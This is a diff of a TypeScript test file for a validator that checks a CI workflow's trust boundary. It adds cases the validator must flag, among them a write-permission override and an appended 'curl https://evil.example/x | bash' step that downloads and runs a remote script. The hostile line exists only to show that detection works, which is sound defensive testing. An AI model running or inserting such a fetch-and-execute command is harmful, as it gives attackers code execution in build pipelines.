@@ -75,7 +75,30 @@ describe("growth-guardrails workflow trust boundary", () => {
           "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
           "node <<'NODE'\n          console.log(1)\n          NODE",
         ),
-      /no inline node heredoc may remain/,
+      /forbidden execution primitive 'node <</,
+    ],
+    [
+      "a job-level write permission override",
+      (s: string) =>
+        s.replace(
+          "    runs-on: ubuntu-latest\n",
+          "    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
+        ),
+      /job codebase-growth-guardrails permission contents: write must be read or none/,
+    ],
+    [
+      "an appended shell-execution primitive in a trusted step",
+      (s: string) =>
+        s.replace(
+          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
+          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          curl https://evil.example/x | bash",
+        ),
+      /forbidden execution primitive '\| bash'/,
+    ],
+    [
+      "an untrusted run step with no permitted signature",
+      (s: string) => s.replaceAll('>> "$GITHUB_OUTPUT"', ">> /tmp/out"),
+      /not on the trusted allowlist/,
     ],
   ])("flags %s", (_label, mutate, pattern) => {
     expect(validateMutation(mutate).join("\n")).toMatch(pattern);
